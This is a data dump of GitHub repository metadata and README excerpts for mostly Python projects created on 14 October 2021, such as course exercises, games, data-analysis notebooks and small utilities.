417210976;IBM-Coursera-DataVisualizationWithPython;https://github.com/macedoti13/IBM-Coursera-DataVisualizationWithPython;Python;2021-10-14T16:49:19Z;0;0;0;IBM-Coursera-DataVisualizationWithPython 
417306610;Python-for-Data-science-AI-and-development;https://github.com/carlintchuisseu/Python-for-Data-science-AI-and-development;;2021-10-14T23:04:45Z;0;0;0;Python-for-Data-science-AI-and-development This repo contains hands on of the course Python for Data science, AI and Development from the IBM Data science Certificate on Coursera 
417237280;One-Click-Essential-App-Runner-with-Python;https://github.com/zionmezba/One-Click-Essential-App-Runner-with-Python;Python;2021-10-14T18:14:58Z;1;1;0;
417251658;python-unit-test-automation-2e;https://github.com/Apress/python-unit-test-automation-2e;Python;2021-10-14T19:05:40Z;0;0;0;Apress Source Code This repository accompanies Python Unit Test Automation, 2nd Edition by Ashwin Pajankar (Apress, 2022).  Download the files as a zip using the green button, or clone the repository to your machine using Git. Releases Release v1.0 corresponds to the code in the published book, without corrections or updates. Contributions See the file Contributing.md for more information on how you can contribute to this repository. 
417204239;ICS3U-Unit5-03-Python;https://github.com/trent-hodgins-01/ICS3U-Unit5-03-Python;Python;2021-10-14T16:27:47Z;0;0;0;ICS3U-Unit5-03-Python  
417275407;ICS3U-Assignment-05-Python;https://github.com/Michael-Zagon/ICS3U-Assignment-05-Python;Python;2021-10-14T20:37:43Z;0;0;0;ICS3U-Assignment-05-Python  
417255229;python-neural-network-forecasting-multiple-outputs;https://github.com/darius-atlas/python-neural-network-forecasting-multiple-outputs;Python;2021-10-14T19:18:13Z;0;0;0;
417202095;pkg-update-pkg-upgrade-pkg-install-git-pkg-install-python2-pip2-install-requests-pip2-install;https://github.com/beggeng/pkg-update-pkg-upgrade-pkg-install-git-pkg-install-python2-pip2-install-requests-pip2-install;;2021-10-14T16:20:44Z;0;0;0;pkg-update-pkg-upgrade-pkg-install-git-pkg-install-python2-pip2-install-requests-pip2-install 
417259363;October-2nd_week-codes;https://github.com/hdmtp-s-basement/October-2nd_week-codes;CSS;2021-10-14T19:33:45Z;0;0;0;October-2nd_week-codes 
417212772;SakurajimaMai;https://github.com/0Chencc/SakurajimaMai;Python;2021-10-14T16:54:53Z;3;3;1;SakurajimaMai 信息聚合自动推送机器人  初衷：笔者经常关注b站和微博一些有意思的自媒体或者比赛信息，但是如果按照了b站和微博会不知不觉被吸引从而耗费掉大量的时间（自从我卸载了这些社交媒体之后，发现自己多了很多时间），但是还是想要关注这类博主的更新，于是自己决定编写一个自动推送更新的机器人来告知更新，同时常常忘记吃饭，顺带加上了提醒我点外卖吃饭的功能。 须知：由于github政策原因，这个项目是无法在github自身的云服务器上运行的，所以需要配置自己的私有云（self-hosted）来运行。 私はいつも桜島麻衣が好きです 目前已经实现的功能(Function) 1.微博博主动态更新推送 2.B站UP主更新推送 3.定时提醒吃饭，设定好吃饭时间之后到时间会推送 4.B站番剧更新推送 5.acfun(A站)UP主更新推送 6.待续（如果有需要的功能可以提issue） 如何配置(Setting) fork本项目到自己的仓库，然后Settings-Actions-Runners-New self-hosted-runner，通过github官方给的教程来设置自己的私有云。 服务器必要环境：Python3.9 提前预装好Pyhton3.9即可（必要python3，其他版本可以自行修改./github/workflows/main.yml文件中所有python3.9字符，没测试过在低版本运行有无报错） 如果遇到安装依赖的报错，请升级setuptools python3.9 -m pip install --upgrade setuptools 以下所有变量需要在Setting->Secret中配置 必要变量：钉钉机器人(DingRobot)的WEBHOOK，SECRET（密钥）-> 如何配置 吃饭则是一日三餐的时间，我早餐(BREAKFAST)不吃，午餐(LUNCH)，晚餐(DINNER)吃，比方说我午餐是11点吃，那么就需要设置LUNCH=1100，晚餐是17点30吃，则是DINNER=1730 微博则是WB_UIDS，需要用逗号作为分隔，例如->WB_UIDS=2099708877,5524254784 同理b站UP则是BUPIDS，例如->BUPIDS=5970160,98573631 番剧则是BAIDS，如下图中，ss之后的那串数字，例如->BAIDS=36170 以上都是用户id，微博就是该用户主页之后的那串数字，b站up主则是up主个人空间网址的那串数字，a站up主同理，也是主页之后的那串数字     配置钉钉机器人 需要注册一个钉钉账号，同时建立一个群聊（电脑端可以创建只有自己的群聊） 添加一个webhook机器人，验证方式选用加签。 如图：   之后就需要在Setting->Secret中配置WEBHOOK为钉钉机器人的webhook地址，SECRET为密钥 
417210131;100_days;https://github.com/mystic-moon005/100_days;;2021-10-14T16:46:38Z;0;0;0;100_days 100 days of Coding - Python 
417240307;codewriter;https://github.com/structuredman/codewriter;Python;2021-10-14T18:25:20Z;0;0;0;
417243589;blog_django_update;https://github.com/vmgn16/blog_django_update;JavaScript;2021-10-14T18:36:45Z;0;0;0;
417286199;Netology_diploma2;https://github.com/alexandermedv/Netology_diploma2;Python;2021-10-14T21:23:54Z;0;0;0;
417273973;chat-bot;https://github.com/Lilyaddy15/chat-bot;Python;2021-10-14T20:31:42Z;0;0;0;
417293482;pygun;https://github.com/TensorTom/pygun;;2021-10-14T21:58:13Z;1;1;0;pygun GUN (GunDB) transpiled to Python 
417259843;Module17-Final-Assignment-Analysis;https://github.com/saranyadurairaju/Module17-Final-Assignment-Analysis;Jupyter Notebook;2021-10-14T19:35:47Z;0;0;0;Credit Card risk Analysis with Machine Learning Machine learning is a method of data analysis that automates analytical model building. It is a branch of artificial intelligence based on the idea that systems can learn from data, identify patterns and make decisions with minimal human intervention. It has been used in multiple fields and industries. For example, medical diagnosis, image processing, prediction, classification, learning association, regression etc. Machine Learning is divided into three types: supervised learning, unsupervised learning, and reinforcement learning. Although it may seem that the first refers to prediction with human intervention and the second does not, these two concepts are more related with what we want to do with the data. Overview In this project we will apply machine learning to solve a real-world challenge: credit card risk. Credit risk is an inherently unbalanced classification problem, as good loans easily outnumber risky loans. Therefore, we’ll need to employ different techniques to train and evaluate models with unbalanced classes. We are going to use imbalanced-learn and scikit-learn libraries to build and evaluate models using resampling. Using the credit card dataset, we’ll oversample the data using the RandomOverSampler and SMOTE algorithms, and undersample the data using the ClusterCentroids algorithm. Then, we'll use a combinatorial approach of over and undersampling using the SMOTEENN algorithm. Next, we’ll compare two new machine learning models that reduce bias, BalancedRandomForestClassifier and EasyEnsembleClassifier, to predict credit risk. Once we’re done, we’ll evaluate the performance of these models and make a written recommendation on whether they should be used to predict credit risk. Below are the list of Deliverables:  Deliverable 1: Resampling Models to Predict Credit Risk Deliverable 2: The SMOTEENN Algorithm to Predict Credit Risk Deliverable 3: Ensemble Classifiers to Predict Credit Risk Deliverable 4: A Written Report on the Analysis (README.md)  Analysis We will use jupypter notebook with python packages for our Analysis. In all the steps we will import the dependencies, define the columns, Load the data. Then we will create the training and testing variables by converting the string values into numerical ones using the get_dummies() method. We can also create the target variables and check the balance of it using the below set of codes. Creating target variables  Split the Data into Training and Testing  The precision, recall scores and finally F1 score After the accuracy score and with Confusion matrix values we will create a classification report. Basically the below methods are used to calculate the Precision, Recall and F1 score (harmonic mean):     Deliverable 1: Resampling Models to Predict Credit Risk With our knowledge of the imbalanced-learn and scikit-learn libraries, we’ll evaluate three machine learning models by using resampling to determine which is better at predicting credit risk. First, we’ll use the oversampling RandomOverSampler and SMOTE algorithms, and then we’ll use the undersampling ClusterCentroids algorithm. Using these algorithms, we’ll resample the dataset, view the count of the target classes, train a logistic regression classifier, calculate the balanced accuracy score, a confusion matrix, and generate a classification report. Random Oversampling  SMOTE Oversampling  ClusterCentroids Undersampling  Deliverable 2: The SMOTEENN Algorithm to Predict Credit Risk Using the SMOTEENN algorithm, we’ll resample the dataset, view the count of the target classes, train a logistic regression classifier, calculate the balanced accuracy score, generate a confusion matrix, and generate a classification report. Combination (Over and Under) Sampling  Deliverable 3: Ensemble Classifiers to Predict Credit Risk With our knowledge of the imblearn.ensemble library, we’ll train and compare two different ensemble classifiers, BalancedRandomForestClassifier and EasyEnsembleClassifier, to predict credit risk and evaluate each model. Using both algorithms, we’ll resample the dataset, view the count of the target classes, train the ensemble classifier, calculate the balanced accuracy score, generate a confusion matrix, and generate a classification report. Balanced Random Forest Classifier  Feature importance in descending order  Easy Ensemble AdaBoost Classifier  Results So, from our above six Machine Learning Models we can describe the balanced accuracy scores, the precision, recall scores and finally F1 score (harmonic mean). Below are the corresponding values for each Algorithms:  Summary From the above results and table of counts we can clearly see the balanced accuracy scores and the precision and recall scores and the F1 Score are high for Easy Ensemble AdaBoost Classifier Machine learning algorithm. Also, the F1 score can be characterized as a single summary statistic of precision and sensitivity(recall) and it is a great measurement to gauge model performance. From the above table values the best performing model is the Easy Ensemble Classifier with an average F1 score of 0.96. While the worst performing is Cluster Centroid with an average F1 score of 0.60. So, we can apply this machine learning technique to solve a credit card risk in real-world. 
417206170;handtrack;https://github.com/shuklansh/handtrack;Python;2021-10-14T16:33:49Z;0;0;0;handtrack hand tracking module using python use the mediapipe and opencv-python libraries 
417292371;emoji-land;https://github.com/sodapoph/emoji-land;Python;2021-10-14T21:53:05Z;0;0;0;
417217443;calculator;https://github.com/tzavopoulos/calculator;Python;2021-10-14T17:08:50Z;1;1;0;Calculator My first calculator in Python 
417311632;Isaac-School-projects-;https://github.com/Leeisaac2555/Isaac-School-projects-;;2021-10-14T23:32:56Z;0;0;0;
417243909;HW-autocomplete;https://github.com/snouragan/HW-autocomplete;;2021-10-14T18:37:47Z;0;0;0;
417205558;Hello;https://github.com/arunmathewm/Hello;HTML;2021-10-14T16:31:51Z;0;0;0;
417214999;proxy_tester;https://github.com/sdipietro/proxy_tester;Python;2021-10-14T17:01:26Z;0;0;0;Proxy Results Good and bad proxies will be inputted to the proxy_results.txt file. Proxies.txt Input your proxies into the proxies.txt file in an ip:port format or a ip:port:user:pass format. No other formats are supported. Sitelist.xt Input your sitelist into the sitelist.txt file in the http://website.com/ format. Todo:  Add proxy timeout feature. Add GUI.  
417260848;PyWhatchdog;https://github.com/lBa3/PyWhatchdog;Python;2021-10-14T19:39:43Z;0;0;0;PyWhatchdog monitor de carptas en python --- dependencias--- watchdog 2.1.6 
417231979;passwordGenerator;https://github.com/alexmannuel/passwordGenerator;Python;2021-10-14T17:57:03Z;0;0;0;passwordGenerator Basic password generator in python 
417301376;rsa_enc;https://github.com/WouterPennings/rsa_enc;Python;2021-10-14T22:37:36Z;0;0;0; RSA Encryption This repository contains Python code, with which I am experimenting with RSA encryption 
417304197;matchcaselib;https://github.com/MasterCoder21/matchcaselib;Python;2021-10-14T22:52:07Z;0;0;0;"Match-Case Library a.k.a. matchcaselib  Welcome to matchcaselib, an easy implementation of Python 3.10's new feature of structural pattern matching. This project is currently in a BETA STAGE. Installation You can install this package by running the following command in your terminal: pip install matchcaselib or update it with the command pip install --upgrade matchcaselib  Usage from matchcaselib import match  a = input(""Enter in a number: "") a = int(a) b = input(""Enter in another number: "") b = int(b)  with match(a, b) as m:   if(m.case(1, 1)):     print(""All ones."")   if(m.case(1, 2)):     print(""One and two."")   if(m.case(a, 1)):     print(""The value of A can be anything!  A was {} and b was 1."".format(a))   if(m.default):     print(""I don't know what you mean..."")  What you can do:  Compare as many sets of variables as you would like (the amount you provide with the initialization of the class must be consistent with the amount you use for the case method.) Make a ""default"" response - Run a block if default is true (no matches were found)  Work in Progress features:  Multi-pattern matching (test for multiple patterns) Break function - leave the current match  What not to do:  Use different amounts of variables for the class initialization and the use of the case method I don't know, there aren't many bugs right now LOL  "
417205463;gen-py;https://github.com/kunosyn/gen-py;Python;2021-10-14T16:31:31Z;0;0;0;
417218970;ICS3U-Unit5-01-Python-Temperature;https://github.com/Mikayla-Barthelette-1/ICS3U-Unit5-01-Python-Temperature;Python;2021-10-14T17:13:39Z;0;0;0;ICS3U-Unit5-01-Python-Temperature  
417237889;Python-Fundamentos-Para-Analise-de-Dados-3.0;https://github.com/ALXAVIER-DEV/Python-Fundamentos-Para-Analise-de-Dados-3.0;Jupyter Notebook;2021-10-14T18:17:00Z;0;0;0;Python-Fundamentos-Para-Analise-de-Dados-3.0 Curso da DSA para introdução a análise de Dados usando Python. 
417202046;ICS3U-Unit3-07-Python-Grandma;https://github.com/Mikayla-Barthelette-1/ICS3U-Unit3-07-Python-Grandma;C++;2021-10-14T16:20:36Z;0;0;0;ICS3U-Unit3-07-CPP-Grandma  
417279283;progress-bar-python-text-zJTa9l;https://github.com/tryspidy/progress-bar-python-text-zJTa9l;Python;2021-10-14T20:54:09Z;0;0;0;
417263100;python-network-multiple-layers-and-outputs-and-inputs;https://github.com/darius-atlas/python-network-multiple-layers-and-outputs-and-inputs;Python;2021-10-14T19:48:21Z;0;0;0;
417246755;web-app-development-real-time-web-analytics-python;https://github.com/Apress/web-app-development-real-time-web-analytics-python;Jupyter Notebook;2021-10-14T18:48:17Z;0;0;0;Apress Source Code This repository accompanies Web App Development and Real-Time Web Analytics with Python by Tshepo Chris Nokeri (Apress, 2022).  Download the files as a zip using the green button, or clone the repository to your machine using Git. Releases Release v1.0 corresponds to the code in the published book, without corrections or updates. Contributions See the file Contributing.md for more information on how you can contribute to this repository. 
417258969;python-neural-network-multiple-input-and-outputs-forecasting;https://github.com/darius-atlas/python-neural-network-multiple-input-and-outputs-forecasting;Python;2021-10-14T19:32:14Z;0;0;0;
417261055;crawl_zalo;https://github.com/LocNguyen2000/crawl_zalo;Python;2021-10-14T19:40:39Z;0;0;0;Crawl Zalo  Proxy Server, Python Requests, RabbitMQ Server(Pika)  1. Start RabbitMQ Server  Download https://www.rabbitmq.com/download.html Run service .bat file in rabbitmq_server-3.8.16\sbin check localhost:15672 if it's working  2. Run file  pip install -r requirements.txt run send.py + receive.py  
417267774;hateblockers_tweets_extractor;https://github.com/mrverde/hateblockers_tweets_extractor;Python;2021-10-14T20:06:32Z;0;0;0;Hateblockers Proyecto: Medidor de odio En este proyecto realizado en Python 3.8 para Hateblockers se aborda la creación de un dashboard que busca medir el odio dentro de la red social twitter en función de los tweets de los usuarios. Extractor de tweets La extracción de tweets se realiza con el script hateblockers_tweets_extractor.py. Para ejecutarlo es necesario en primer lugar crear un virtual environment con las dependencias del archivo requirements.txt. Puede accederse a la documentación para crear un virtual environment desde aquí. Para ejecutar el script hay que invocar desde consola el comando: python hateblockers_tweets_extractor.py  El script automáticamente buscará los términos existentes en el archivo terms_to_search.txt. Habrá de declararse un término por línea. Es necesario configurar el archivo .env con las siguientes variables:   API_KEY, API_SECRET, ACCESS_TOKEN, ACCESS_TOKEN_SECRET - Credenciales de twitter   EXPORT_LOG - Bool. Sirve para definir si queremos que se cree un log del proceso de extracción   LOG_FILE - String. Nombre del archivo donde se volcarán los datos del log.   OUTPUT_FILE - String. Nombre del archivo de salida donde se volcarán los tweets extraídos.   EXCLUDE_RETWEETS - Bool. Sirve para excluir los retweets de la extracción.   
417272780;Simple-Text-Calculator;https://github.com/GreenAppleCode/Simple-Text-Calculator;Python;2021-10-14T20:27:00Z;0;0;0;
417287341;chess-terminal;https://github.com/Sergo007/chess-terminal;Python;2021-10-14T21:29:06Z;0;0;0;
417246273;api-registro-animais;https://github.com/lericke/api-registro-animais;;2021-10-14T18:46:34Z;0;0;0;api-registro-animais API de estudos Python com FastAPI 
417206781;Curso-Django-Platzi;https://github.com/eddgt/Curso-Django-Platzi;;2021-10-14T16:35:52Z;0;0;0;
417200813;chatapp-demo;https://github.com/GarrettRector/chatapp-demo;Python;2021-10-14T16:17:09Z;0;0;0;chatapp-demo Demo for python backend chat app 
417222113;Colorama;https://github.com/PranavG71004/Colorama;Python;2021-10-14T17:24:04Z;0;0;0;Colorama Python Assignment - Getting familiar with Colorama Module 
417225743;Tic-Tac-Toe;https://github.com/Domincog/Tic-Tac-Toe;Python;2021-10-14T17:36:00Z;0;0;0;Tic-Tac-Toe Simple tic-tac-toe implementation using Python. Future Implimentations: V1.1.0  Release Schedule: 10/17/2021 [ Y ] Prevent users from overiding each-others placements on tic-tac-toe board [ Y ] Make the tic-tac-toe game ask if players want to play again [ P ] Make code more legible (better comments / syntax) V1.2.0  Release Schedule: 11/1/2021 [ N ] Add a 'computer' for a player to play against INDEX [ Y ] = completed [ N ] = incomplete [ P ] = in progress NOTE -The features labeled for each release are not final, and new features are being continuously added. -Release schedule dates are the absolute latest intended date for a new version to be pushed, and it is possible for        releases to be completed much earlier than the date specified. If a release is pushed early, the scheduled dates in      this readme will be modified to reflect this 
417282266;DDos;https://github.com/resist12/DDos;Python;2021-10-14T21:05:57Z;0;0;0;
417203429;Token_Grabber;https://github.com/LikeysDragon/Token_Grabber;Python;2021-10-14T16:24:59Z;0;0;0;
417217172;adt;https://github.com/aarondewindt/adt;Python;2021-10-14T17:07:56Z;0;0;0;ADT Algebraic Data Types for Python's pattern matching introduced in version 3.10 
417258777;ftpy;https://github.com/Stift007/ftpy;Python;2021-10-14T19:31:32Z;0;0;0;ftpy A Simple File Transferring Program in Python. 
417250537;FizzBuzz;https://github.com/kennabogue/FizzBuzz;Python;2021-10-14T19:01:55Z;0;0;0;
417243008;hello;https://github.com/zborov/hello;HTML;2021-10-14T18:34:44Z;0;0;0;
417261770;talan;https://github.com/beyondbond/talan;Python;2021-10-14T19:43:24Z;0;0;1;TALAN: Technical Alogorithmic Analytics TALAN is a python package that provides a list of functions for technical analysis To install pip install git+https://github.com/beyondbond/talan --upgrade --user or git clone https://github.com/beyondbond/talan cd talan pip install --upgrade --user . 
417211333;Data-Analytics-Projects;https://github.com/ankit7699/Data-Analytics-Projects;Jupyter Notebook;2021-10-14T16:50:29Z;0;0;0;Data-Analytics-Projects Data Analytics Project -- (Python,Power BI, Tableau) 
417275847;TODOPy;https://github.com/nafuent/TODOPy;HTML;2021-10-14T20:39:43Z;0;0;0;TODO APP Py TODO APP with Python and Flask 
417209303;Clicker_Game;https://github.com/ChampX5/Clicker_Game;;2021-10-14T16:44:02Z;0;0;0;"Download the assets.zip folder, and extract the files. Keep the files in a folder called ""assets"". "
417235365;NeuralNetwork-Implementation;https://github.com/Miden0/NeuralNetwork-Implementation;Python;2021-10-14T18:08:25Z;0;0;0;
417314909;Week_05;https://github.com/existentialplantperson/Week_05;Jupyter Notebook;2021-10-14T23:51:38Z;0;0;0;Week_05 Week 5 - Python: Plotting (Matplotlib and Seaborn) 
417197904;Pyton_Projects;https://github.com/BatistaAlexandre/Pyton_Projects;Python;2021-10-14T16:08:12Z;0;0;0;Pyton_Projects Some tests and small projects in Python 
417209133;files_cryptography_app;https://github.com/MakensonNoel/files_cryptography_app;Python;2021-10-14T16:43:33Z;0;0;0;crytography program created to demonstrate the understanding of functions and (text) file operations in Python. 
417224555;simple-server;https://github.com/mostanglan/simple-server;Python;2021-10-14T17:31:55Z;0;0;0;
417216259;tello_drone;https://github.com/spragunr/tello_drone;Python;2021-10-14T17:05:06Z;0;0;0;tello_drone Python 3 library for controlling DJI Tello Drones This library provides a thin wrapper around the DJITelloPy library, which itself is a wrapper around the official DJI Tello Python SDK. The main advantage of this library is that it makes it simple to view and record video during execution. To install dependencies: pip install https://github.com/damiafuentes/DJITelloPy/archive/master.zip pip install opencv-python  Example usage: from tello import Drone  with Drone() as d:     d.start_video('video.avi')     d.takeoff()     d.move_forward(50)     d.rotate_clockwise(360)     d.wait(5.0)     d.land() The full list of available methods can be found at https://djitellopy.readthedocs.io/en/latest/tello/. 
417308477;hello;https://github.com/billywojcicki/hello;HTML;2021-10-14T23:14:35Z;0;0;0;
417212077;Calculadora;https://github.com/CharlyBeatle/Calculadora;Python;2021-10-14T16:52:41Z;0;0;0;
417201913;Fibonacci-Sequence;https://github.com/PranavG71004/Fibonacci-Sequence;Python;2021-10-14T16:20:11Z;0;0;0;Fibonacci-Sequence Python Assignment - Creating the Fibonacci sequence 
417287989;bono;https://github.com/gojoGS/bono;Python;2021-10-14T21:31:50Z;0;0;0;bono  Named after the esporter, not the monkey, although they look similar to the unsophisticated eye  A simple build.gradle generator in Python Included non-optinals  java plugin application plugin  Included optionals  Java language version JAXB JUnit lombok JavaFX  Usage  Run without arguments to print the generated build file to stdout Run with one argument, filename, to save the generated file to filename  
417210137;Hangman;https://github.com/Airdrie86/Hangman;HTML;2021-10-14T16:46:38Z;0;0;0;"Hangman Hangman is a Python terminal game, which runs in the Code Institute mock terminal on Heroku. Users will try to guess the word by inputting letters(or guessing the word).  How to play Hangman is a classic Guess the Word game. Click here to find out more The game will atomatically generate a word, which will be visible as (""_"") and the user has 6 lives to guess the word. they will do so y inputting letters or guess the word. Features Existing Features  Welcome screen Allows user to enter name  User name will be used throughout the game Allows multiple user inputs  Shows user the letters/ words they have guessed Hangman structure updates if they get a letter/word wrong. Shows the user how many tries they have left Shows the user which letter has been correctly guessed Updates the word when user correctly guesses word/letter  Confirms to the user when they have correctly guessed all letters or if they have ran out of tries and tells the user what the word was.   Testing I have manually tested the following:  Passed the code through a PEP8 linter and confirmed there are no problems Tested in my local terminal and the Code Institute Heroku terminal  Bugs No bugs remaining Validator Testing  No errors were returned from PEP8online.com  Deployment This project was deployed using Code Institute's mock terminal for Heroku.  Steps for Deployment:  Fork or clone this repository Create a new Heroku app Set the buildbacks to Pyhton and NodeJS in that order Link the Heroku app to repository Click on Deploy    Credits  Code Institute for the deployment terminal Stackoverview Wikipedia for the details of the Hanfman game  "
417292289;PyUtopiaClient;https://github.com/MisterMine01/PyUtopiaClient;Python;2021-10-14T21:52:46Z;0;0;0;
417256432;InGroupProportion;https://github.com/Raika96/InGroupProportion;Python;2021-10-14T19:22:42Z;0;0;0;"InGroupProportion This is a simple implementation of In-Group Proportion (IGP) in python. This function can be used to evaludate the reproduciblity of clustering results and validate the consistency of clusters in different dataset. Description The function get the dataset, clustering results and the criteria for finding the nearest neighbour. There are two measures for finding the nearest nieghbour:  Euclidean Distance Pearson Correlation  Reference  Implementation in R: https://rdrr.io/cran/clusterRepro/man/IGP.clusterRepro.html Associated Paper: Kapp AV, Tibshirani R. Are clusters found in one dataset present in another dataset? Biostatistics. 2007 Jan;8(1):9-31. doi: 10.1093/biostatistics/kxj029. Epub 2006 Apr 12. PMID: 16613834.  "
417207211;simple-orm;https://github.com/JosephWoodside/simple-orm;;2021-10-14T16:37:14Z;0;0;0;simple-orm Simple Python ORM for interacting with PostgreSQL 
417221568;aes-128-ecb;https://github.com/N3-Z/aes-128-ecb;Python;2021-10-14T17:22:18Z;0;0;0;encrypt:  python aes.py [text]  decrypt: copas response request, copy to file respon-json.json  python aes.py  
417240648;DataFrameProjects;https://github.com/Gauri-CO/DataFrameProjects;;2021-10-14T18:26:29Z;0;0;0;
417259400;pyUsage;https://github.com/Malphaet/pyUsage;;2021-10-14T19:33:53Z;0;0;0;pyUsage Monitor Python Function Usage, Usetime and others... 
417304331;Editor-de-texto;https://github.com/jaedsonpys/Editor-de-texto;Python;2021-10-14T22:52:53Z;0;0;0;Simples editor de texto Esse editor de texto foi criado utilizando Tkinter e Python, além de ser leve, suporta vários tipos de arquivos! 
417307029;programming-languages;https://github.com/sbacon99/programming-languages;Python;2021-10-14T23:06:55Z;0;0;0;programming-languages Consists of Java and Python labs/activities. 
417233275;Face-mask-detection;https://github.com/m00ke5h/Face-mask-detection;Python;2021-10-14T18:01:28Z;0;0;0;FACE MASK DETECTION  
417248280;truco;https://github.com/nbridges-code/truco;Python;2021-10-14T18:53:58Z;0;0;0;truco Python implementation of Truco card game. See https://www.pagat.com/put/truco_br.html for rules 
417276778;Space-Invaders;https://github.com/akilakila/Space-Invaders;Python;2021-10-14T20:43:40Z;0;0;0;Space-Invaders Video game created using Python and Pygame 
417220030;Notifier-Bot;https://github.com/SakshayMahna/Notifier-Bot;PowerShell;2021-10-14T17:17:07Z;0;0;0;Notifier Bot Notifier Bot is a Python library consisting of different Notification Bots Available Bots  Telegram Bot  Setup Telegram Bot   Refer to this link to create a Telegram Bot and get the BOT_TOKEN and CHAT_ID.   Use the BOT_TOKEN and CHAT_ID to initialize TelegramConfig object.   Use the TelegramConfig object to initialize TelegramBot.   Examples Refer to examples directory 
417277071;CcAsignment;https://github.com/therealabdi2/CcAsignment;Python;2021-10-14T20:44:52Z;0;0;0;
417201644;Pong;https://github.com/Gaiote/Pong;Python;2021-10-14T16:19:26Z;0;0;0;Pong O clássico jogo Pong em python 
417197826;WebApp;https://github.com/himank3029/WebApp;Python;2021-10-14T16:07:56Z;0;0;0;
417219607;UserAuthentication;https://github.com/Justagamer48/UserAuthentication;Python;2021-10-14T17:15:36Z;0;0;0;UserAuthentication User authentication program using python and sqlite Takes the users username and password, and authenticates if they are allowed access or denied. Will be continuing to add to this when I can a work in progress : ) 
417258365;Utility;https://github.com/liron7722/Utility;Python;2021-10-14T19:30:09Z;0;0;0;Utility Some python utility tools for my projects This is a simple example package. You can use 
417220191;ServiceManager;https://github.com/iMilchshake/ServiceManager;Python;2021-10-14T17:17:37Z;0;0;0;ServiceManager A simple Service Manager that runs terminal commands, logs the results and can contact you about failed jobs. This project is created with daily web scraping jobs in mind, but could be used for other projects aswell. 
417244321;Netology_project;https://github.com/indrocky/Netology_project;Jupyter Notebook;2021-10-14T18:39:25Z;0;0;0;
417233669;space-invaders;https://github.com/InfamousBOTBOY/space-invaders;;2021-10-14T18:02:39Z;0;0;0;
417238959;Driver-Drowsiness-Detection-System;https://github.com/himanshu03jain/Driver-Drowsiness-Detection-System;Python;2021-10-14T18:20:50Z;0;0;0;Driver Drowsiness Detection It is my college project with 2 team members more using machine learning. It can prevent accidents that are caused by drivers who fell asleep while driving and calculate scores, if this score limit is high then the alarm will ring. Scope The scope of the Drowsy Driver Detection in the modern period is to diminish the vehicle street mishap and furthermore this project is utilized for security reasons for a driver as it reduces car accidents. The fatigue detection system in this project is capable of detecting drowsiness on drivers and then based on the current situation will alert the driver using an alarm. Problem statement Fatigue is a safety problem that has not yet been deeply tackled by any country in the world mainly because of its nature. Fatigue, in general, is very difficult to measure or observe unlike alcohol and drugs, which have clear key indicators and tests that are available easily. Probably, the best solutions to this problem are awareness about fatigue-related accidents and promoting drivers to admit fatigue when needed. The former is hard and much more expensive to achieve, and the latter is not possible without the former as driving for long hours is very lucrative. Technology used  Pyhton   Machine learning   Image processing   Some pyhton libraries used in this project are- numpy, keras, tensorflow, OpenCV, Pygame  Algorithm Step 1 – Take image as input from a camera. Step 2 – Detect the face in the image and create a Region of Interest (ROI). Step 3 – Detect the eyes from ROI and feed it to the classifier. Step 4 – Classifier will categorize whether eyes are open or closed. Step 5 – Calculate score to check whether the person is drowsy. Dataset The dataset used for this model is created by us. To create the dataset, we wrote a script that captures eyes from a camera and stores in our local disk. We separated them into their respective labels ‘Open’ or ‘Closed’. The data was manually cleaned by removing the unwanted images which were not necessary for building the model. Or, you can download the dataset from kaggle click here Screenshots Awaken and sleeping person  Flow chart  Contributing Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change. Please make sure to update tests as appropriate. 
417264632;Pose-detection-in-image-with-opencv-python-and-mediapipe-pose-estimation;https://github.com/UlrikHjort/Pose-detection-in-image-with-opencv-python-and-mediapipe-pose-estimation;Python;2021-10-14T19:54:43Z;0;0;0;Pose detection in image with opencv-python (version: 4.5.3.56) and mediapipe pose estimation (version: 0.8.7.3). 
417222495;expenseanalysis_webpage;https://github.com/collyrium921/expenseanalysis_webpage;Python;2021-10-14T17:25:24Z;0;0;0;
417205712;Motion_Detector;https://github.com/pnp642001/Motion_Detector;Python;2021-10-14T16:32:18Z;0;0;0;
417246605;api-animais;https://github.com/lericke/api-animais;Python;2021-10-14T18:47:43Z;0;0;0;api-animais 
417301348;intro-cs-udacity;https://github.com/EnioNicael/intro-cs-udacity;Python;2021-10-14T22:37:26Z;0;0;0;intro-cs-udacity Curso de introducao a ciencia da computacao da Udacity (python) Este repositório é para armazenar aulas e exercicios do curso 
417275549;VocaLights;https://github.com/romanishikov/VocaLights;Python;2021-10-14T20:38:17Z;0;0;0;"Overview VocaLights is the expanding program that takes voice input and registers commands to adjust lighting in various ways. Note: This requires smart light bulbs in order to function as intended.  Tested and validated with LifX and Philips Hue model light bulbs and working on expanding to as many others as are available. Usage You may choose to run the main script in the background and go on through the day. So long as a microphone is within distance, simply speak the desired command and the lights will turn on and off, dim and brighten, change colors, and set the mood for the space of your choice. Main Commands: [Brackets = Required] (Parens = Optional)  Turn off/on (light name or all ""lights"") Dim (light name or all ""lights"") (to # percent) Raise (light name or all ""lights) (to # percent) Change color (of light name or ""lights"") to [RED,ORANGE,YELLOW,GREEN,CYAN,BLUE,PURPLE,PINK,WHITE,GOLD]  "
417222854;coingeckoscraper;https://github.com/sudotman/coingeckoscraper;Python;2021-10-14T17:26:36Z;0;0;0;
417203552;sql;https://github.com/jrlee85/sql;Jupyter Notebook;2021-10-14T16:25:25Z;0;0;0;sql-project Coursera SQL project performing exploratory data analysis on data from the Olympics This project was created as part of the SQL Basics for Data Science specialisation on Coursera. The analysis was performed using pandasql in order to experiment with using SQL commands in Jupyter notebooks with Python, Pandas and Matplotlib. 
417258995;compare-files;https://github.com/MrMaximilian/compare-files;Python;2021-10-14T19:32:20Z;1;1;0;compare-files A Python script that compares files in different directories, this is similar to the command filecmp.cmp(f1, f2). I made this script in Linux and it's meant to be used for Lunix. how it's used: compare.py [directory A] [directory B] Source Code Source code can be found at https://github.com/MrMaximilian/compare-files 
417304334;smarthubctl;https://github.com/harmanhobbit/smarthubctl;Python;2021-10-14T22:52:54Z;0;0;0;"smarthubctl A simple python script for controlling Blackmagic Design Smart Videohub unit. This script is intended to allow for the control of a single unit over TCP/IP from the show control software QLab. However, it can also be run manually from a shell, where it should be cross-platform compatible. This script is written in python V2, as this the default version that ships with macOS. If you have a different version of python running on your mac or PC I believe it will still work, however, I haven't had the chance to test it. Input and output numbers are normalized by the script to allow for human numbering to be used. Usage All methods of use require the  placeholder to be changed for the IP address of the Smart Videohub unit. For example the line address = ""<IP ADDRESS>"" should read something like address = ""192.168.1.100"". Using the script from the command line called in the following way: python smarthubctl.py *input* *output* To allow the script to run from QLab, you need to call the python script from an 